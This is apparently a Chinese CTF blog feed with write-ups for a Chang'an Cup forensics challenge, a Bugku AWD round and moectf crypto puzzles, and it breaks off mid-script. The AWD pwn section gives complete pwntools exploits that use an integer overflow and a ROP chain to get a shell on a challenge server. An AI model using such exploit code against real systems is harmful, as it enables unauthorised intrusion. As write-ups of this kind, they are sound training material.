src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165911743.png" class title="image-20240413165911743"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165941823.png" class title="image-20240413165941823"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165955719.png" class title="image-20240413165955719"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413170018254.png" class title="image-20240413170018254"><p>发现有6个，故答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">158+6=164<br></code></pre></td></tr></table></figure><h2 id="30-还原全部被删改数据，哪些用户ID没有充值记录-答案填写阿拉伯数字，多个ID以逗号分隔，“15-16-17”"><a href="#30-还原全部被删改数据，哪些用户ID没有充值记录-答案填写阿拉伯数字，多个ID以逗号分隔，“15-16-17”" class="headerlink" title="30.还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，“15,16,17”)"></a>30.还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，“15,16,17”)</h2><p>在member_wallet里balance为0是没有充值用户（这个表没有被删除数据），查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> b1.member_wallet <span class="hljs-keyword">WHERE</span> balance <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172116771.png" class title="image-20240413172116771"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">318，989<br></code></pre></td></tr></table></figure><h2 id="31-还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？-答案填写阿拉伯数字，如“15”"><a href="#31-还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？-答案填写阿拉伯数字，如“15”" class="headerlink" title="31.还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)"></a>31.还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)</h2><p>在member_transaction里查询当天的交易数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `member_transaction` <span class="hljs-keyword">WHERE</span> create_time <span class="hljs-keyword">BETWEEN</span> &quot;2022-10-17  00:00:00&quot; <span class="hljs-keyword">AND</span> &quot;2022-10-17 23:59:59&quot;<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172459751.png" class title="image-20240413172459751"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">1000<br></code></pre></td></tr></table></figure><h2 id="32-还原全部被删改数据，该网站中充值的USDT总额为-答案填写阿拉伯数字，如“15”"><a href="#32-还原全部被删改数据，该网站中充值的USDT总额为-答案填写阿拉伯数字，如“15”" class="headerlink" title="32.还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)"></a>32.还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)</h2><p>对金额求和</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">FROM</span> member_transaction<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172620549.png" class title="image-20240413172620549"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">408228.00000000<br></code></pre></td></tr></table></figure><h2 id="33-嫌疑人使用的安卓模拟器软件名称是"><a href="#33-嫌疑人使用的安卓模拟器软件名称是" class="headerlink" title="33.嫌疑人使用的安卓模拟器软件名称是"></a>33.嫌疑人使用的安卓模拟器软件名称是</h2><p>检材4解压得到一个npbk文件，百度得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415140318092.png" class title="image-20240415140318092"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">夜神模拟器<br></code></pre></td></tr></table></figure><h2 id="34-检材4中，“老板”的阿里云账号是"><a href="#34-检材4中，“老板”的阿里云账号是" class="headerlink" title="34.检材4中，“老板”的阿里云账号是"></a>34.检材4中，“老板”的阿里云账号是</h2><p>下载模拟器，导入npbk文件，在微信聊天记录里发现老板阿里云账号（这里打开微信需要断开网络，不然微信会退出，要求重新登录）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142327826.png" class title="image-20240415142327826"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">forensixtech1<br></code></pre></td></tr></table></figure><h2 id="35-检材4中安装的VPN工具的软件名称是"><a href="#35-检材4中安装的VPN工具的软件名称是" class="headerlink" title="35.检材4中安装的VPN工具的软件名称是"></a>35.检材4中安装的VPN工具的软件名称是</h2><p>在桌面发现vpn软件</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415141944182.png" class title="image-20240415141944182"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">v2rayNG<br></code></pre></td></tr></table></figure><h2 id="36-上述VPN工具中记录的节点IP是"><a href="#36-上述VPN工具中记录的节点IP是" class="headerlink" title="36.上述VPN工具中记录的节点IP是"></a>36.上述VPN工具中记录的节点IP是</h2><p>打开vpn，得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142654778.png" class title="image-20240415142654778"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">38.68.135.18：8090<br></code></pre></td></tr></table></figure><h2 id="37-检材4中，录屏软件安装时间为"><a href="#37-检材4中，录屏软件安装时间为" class="headerlink" title="37.检材4中，录屏软件安装时间为"></a>37.检材4中，录屏软件安装时间为</h2><p>找到手机文件，发现一个LuPingDaShi的文件夹</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142957781.png" class title="image-20240415142957781"><p>答案</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2022</span>/<span class="hljs-number">10</span>/<span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><h2 id="38-上述录屏软件中名为“s-20221019105129”的录像，在模拟器存储中对应的原始文件名为"><a href="#38-上述录屏软件中名为“s-20221019105129”的录像，在模拟器存储中对应的原始文件名为" class="headerlink" title="38.上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为"></a>38.上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为</h2><p>在手机文件夹&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;Android&#x2F;data&#x2F;com.jiadi.luping&#x2F;files&#x2F;Movies目录下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d<br></code></pre></td></tr></table></figure><h2 id="39-上述录屏软件登录的手机号是"><a href="#39-上述录屏软件登录的手机号是" class="headerlink" title="39.上述录屏软件登录的手机号是"></a>39.上述录屏软件登录的手机号是</h2><p>选择帮助与反馈-&gt;账号注销即可看到完整手机号（这里需要连接网络，不然一直在加载）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415144224605.png" class title="image-20240415144224605"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">18645091802<br></code></pre></td></tr></table></figure><h2 id="40-检材4中，发送勒索邮件的邮箱地址为"><a href="#40-检材4中，发送勒索邮件的邮箱地址为" class="headerlink" title="40.检材4中，发送勒索邮件的邮箱地址为"></a>40.检材4中，发送勒索邮件的邮箱地址为</h2><p>在qq邮箱中已发送邮件中找到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415145413008.png" class title="image-20240415145413008"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">skterran@163.com<br></code></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://blog.csdn.net/qq_56037764/article/details/127834747">2022第四届长安杯复盘（WP）_长安杯复现-CSDN博客</a></p><p><a href="https://www.forensics-wiki.com/writeup/2022changancup/#8-1apkhttpswwwforensixcnabcdef">2022长安杯Writeup - Forensics-Wiki</a></p><p><a href="https://forensics.xidian.edu.cn/wiki/ChanganCup2022/#8-1-apkhttpswwwforensixcnabcdef">2022长安杯 - XDforensics-Wiki (xidian.edu.cn)</a></p><p><a href="https://blog.csdn.net/jyttttttt/article/details/127704893">2022第四届长安杯WRITE UP_2022长安杯wp-CSDN博客</a></p><h2 id="仿真后连接xshell"><a href="#仿真后连接xshell" class="headerlink" title="仿真后连接xshell"></a>仿真后连接xshell</h2><p>连接xshell，<a href="https://blog.csdn.net/ntrybw/article/details/126226322">修改linux内网卡配置，开启dhcp</a>，分配一个ip给虚拟机，重启后查看（当然这里也可以直接挂载在现有linux虚拟机上）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409104642658.png" class title="image-20240409104642658">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bugku AWD S2-23</title>
    <link href="/2024/03/27/S2-23/"/>
    <url>/2024/03/27/S2-23/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。</p><p>查看保护，只有NX保护</p><img src="/2024/03/27/S2-23/image-20240327170536541.png" class title="image-20240327170536541"><p>ida F5分析</p><img src="/2024/03/27/S2-23/image-20240327170625374.png" class title="image-20240327170625374"><p>这里有个简单整数溢出,输入2147483648，执行vuln函数，</p><img src="/2024/03/27/S2-23/image-20240327171034907.png" class title="image-20240327171034907"><p>buf这里有个很明显的栈溢出，存在system函数，但是参数不是&#x2F;bin&#x2F;sh。Shirt + F12查找字符串，存在字符&#x2F;bin&#x2F;sh</p><img src="/2024/03/27/S2-23/image-20240327171302262.png" class title="image-20240327171302262"><p>所以思路很明确，利用这里的栈溢出修改system的参数，拿shell，</p><img src="/2024/03/27/S2-23/image-20240327171557436.png" class title="image-20240327171557436"><p>64位程序，我们需要先控制rdi寄存器，因此构造rop链：b’a’*(0x20+8)+p64(pop_rdi_ret)+p64(binsh)+p64(system),这里需要考虑下堆栈平衡，加个ret或者直接call _system,给出两个版本代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;114.67.175.224&#x27;,17977)</span><br><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br>call_system=<span class="hljs-number">0x4011F0</span><br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(call_system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;114.67.175.224&#x27;</span>,<span class="hljs-number">17977</span>)<br>elf = ELF (<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-comment">#ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27;</span><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) <br>payload += p64(ret) <br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh) <br>payload += p64(system)<br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>D盾扫描，存在两个过狗一句话</p><img src="/2024/03/27/S2-23/image-20240327172728529.png" class title="image-20240327172728529"><p>网站cms是PbootCMS V3.0.1，</p>]]></content>
    
    
    <categories>
      
      <category>AWD WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD总结</title>
    <link href="/2024/03/26/AWD%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/26/AWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="14d0ea77467f3c7ba395056eded2c862e949bac016528ccf02f5e272287bc755"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023</title>
    <link href="/2023/10/01/moectf2023/"/>
    <url>/2023/10/01/moectf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Classical-crypto"><a href="#Classical-crypto" class="headerlink" title="Classical crypto"></a><strong>Classical crypto</strong></h1><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a><strong>ezrot</strong></h3><p>密文：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;<span class="hljs-variable">@64E</span>7LC<span class="hljs-variable">@Ecf0</span><span class="hljs-symbol">:D0</span>;<span class="hljs-variable constant_">FDE020D</span><span class="hljs-symbol">:&gt;</span>!=<span class="hljs-number">60</span>=6<span class="hljs-symbol">EE6C0DF3DE:</span><span class="hljs-variable constant_">EFE</span><span class="hljs-symbol">:</span>@<span class="hljs-string">?0</span>4<span class="hljs-symbol">:</span>!96C0tsAJdEA6d;F&#125;%0N<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;rot47_is_just_<span class="hljs-built_in">a_simPle</span>_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;<br></code></pre></td></tr></table></figure><p>根据题目描述，应当是rot密码，出现@！等符号，所以是rot47，用cyberchef解得flag</p><img src="/2023/10/01/moectf2023/clip_image002.png" class title="img"><h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a><strong>可可的新围墙</strong></h3><p>密文：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>jocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBro_lcsOp&#125;e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;F<span class="hljs-number">3</span><span class="hljs-symbol">nc3</span>_ciph<span class="hljs-number">3</span>r_shiFTs_<span class="hljs-number">3</span>ach_l<span class="hljs-number">3</span>TT<span class="hljs-number">3</span>r_By_a_Giv<span class="hljs-number">3</span><span class="hljs-symbol">n_nuMB3</span>r_oF_plac<span class="hljs-number">3</span>s_Ojpj&#125;<br></code></pre></td></tr></table></figure><p>​     根据密文特征（“{}”位置）猜测是栅栏密码，枚举未得到flag，再仔细观察，发现密文中m和e只出现过1次，即加密方式类似如下：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>j<br>ocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBro_lcsOp&#125;<br>e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>jocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBr<br>o_lcsOp&#125;<br>e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>猜测是w型栅栏，用脚本解得flag</p><img src="/2023/10/01/moectf2023/clip_image004.png" class title="img"><h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a><strong>皇帝的新密码</strong></h3><p>密文：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">tvljam</span><span class="hljs-template-variable">&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;CaEsaE_CIphEr_Is_<span class="hljs-built_in">a_vErY</span>_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;<br></code></pre></td></tr></table></figure><p>​     密文显示flag形式的字符串，且开头tvljam与moectf偏移量均为7，猜测是凯撒密码，解得</p><img src="/2023/10/01/moectf2023/clip_image006.png" class title="img"><h3 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a><strong>不是“皇帝的新密码”</strong></h3><p>密文：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">scsfct</span><span class="hljs-template-variable">&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;</span><br></code></pre></td></tr></table></figure><p>md5 of flag (utf-8) </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ea23f80270bdd96b5fcd213cae68eea5<br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;vIgENErE_CIphEr_Is_<span class="hljs-built_in">a_lIttlE</span>_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;<br></code></pre></td></tr></table></figure><p>​     根据密文，开头字母与moectf偏移量并不呈规律变化，不是凯撒密码，根据古典密码的特征，最有可能的是Vigenere，但我们并不会知道密钥，用moectf做密钥解密得</p><img src="/2023/10/01/moectf2023/clip_image008.png" class title="img"><p>发现密钥为goodjo，解得</p><img src="/2023/10/01/moectf2023/clip_image010.png" class title="img"><p>提交flag并不正确，再仔细观察信息，发现提示flag的md5值，将刚刚得到的flag计算md5</p><img src="/2023/10/01/moectf2023/clip_image012.png" class title="img"><p>发现刚刚得到的并不是flag，说明密钥不对，仔细观察，密钥出现good单词，剩下的jo极有可能是job，因此猜测密钥是goodjob，再进行·解密</p><img src="/2023/10/01/moectf2023/clip_image014.png" class title="img"><p>并计算md5</p><img src="/2023/10/01/moectf2023/clip_image016.png" class title="img"><p>发现值与题所给md5相同，得到正确flag</p><p>猫言喵语:</p><p>密文;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">喵喵？ 喵喵喵喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵？喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵 喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵？喵喵喵 喵喵？喵喵？喵喵？ 喵喵喵喵喵喵喵喵？ 喵喵？喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵？喵喵喵喵喵？喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵 喵喵？喵喵喵喵喵喵喵喵？<br></code></pre></td></tr></table></figure><p>Flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX&#125;</span><br></code></pre></td></tr></table></figure><p>​     最开始猜测是兽语解密，但尝试了一番，并没有得到flag，同时注意到题目hint：morse code，告诉我们是摩斯密码，故将文本尝试转换成morse code，解得</p><img src="/2023/10/01/moectf2023/clip_image018.png" class title="img"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h3 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a><strong>Crypto</strong> <strong>入门指北</strong></h3><p>​    运行脚本得flag</p><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!&#125;<br></code></pre></td></tr></table></figure><h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a><strong>baby_e</strong></h3><p>​     e很小，可以采用低加密指数攻击</p><img src="/2023/10/01/moectf2023/clip_image020.png" class title="img"><p>编写脚本得</p><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;SMaLL_3xPon3nt_Mak3_rSa_w3ak!_!lP0iYlJf!M3rux9G9Vf!JoxiMl903lllA&#125;<br></code></pre></td></tr></table></figure><h3 id="bad-E"><a href="#bad-E" class="headerlink" title="bad_E"></a><strong>bad_E</strong></h3><p>非预期脚本：(当时初学Crypto，不知道从那个师傅哪里看到了nthroot_mod这个有限域开方函数，发现还挺好用，一路套脚本😀)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sympy.ntheory.residue_ntheory import nthroot_mod<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>e = 65537<br><span class="hljs-attribute">p</span>=6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571<br><span class="hljs-attribute">q</span>=11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819<br><span class="hljs-attribute">c</span>=63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805<br><span class="hljs-attribute">n</span>=p*q<br><span class="hljs-built_in">print</span>(long_to_bytes(nthroot_mod(c,e,p))<br></code></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">e = 65537<br><span class="hljs-attribute">p</span>=6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571<br><span 